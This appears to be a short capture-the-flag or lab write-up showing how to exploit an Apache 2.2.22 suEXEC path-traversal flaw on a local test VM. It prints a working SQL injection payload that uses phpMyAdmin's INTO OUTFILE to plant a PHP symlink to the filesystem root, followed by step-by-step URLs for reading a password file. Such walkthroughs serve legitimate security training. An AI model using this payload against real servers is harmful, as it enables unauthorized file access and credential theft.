Apache is running with the version 2.2.22

After some research, we found this version is vulnerable. The suEXEC vulnerability is a path traversal. We can do a symlink with / and a php page to access a files the user www-data can read

Path checking code design error, subdirectory entry is determined via `strncmp()`, i.e. in addition to the directory `/var/www/html` described in the configuration, the check will also be successful for `/var/www/html_backup` or `/var/www/htmleditor`.

We can found an exploit here : exploit-db.com/exploits/27397

We can exploit it by uploading a PHP page (with a SQL request in phpmyadmin like in the writeup1)
```SQL
SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'
```

1. https://192.168.56.104/phpmyadmin/index.php -> db phpmyadmin -> `localhost -  phpmyadmin -  pma_bookmark "Bookmarks"` -> execute the SQL request
2. open https://192.168.56.104/forum/templates_c/run.php
3. open https://192.168.56.104/forum/templates_c/paths.php
4. open `/home/LOOKATME/password` https://192.168.56.104/forum/templates_c/paths.php/home/LOOKATME/password
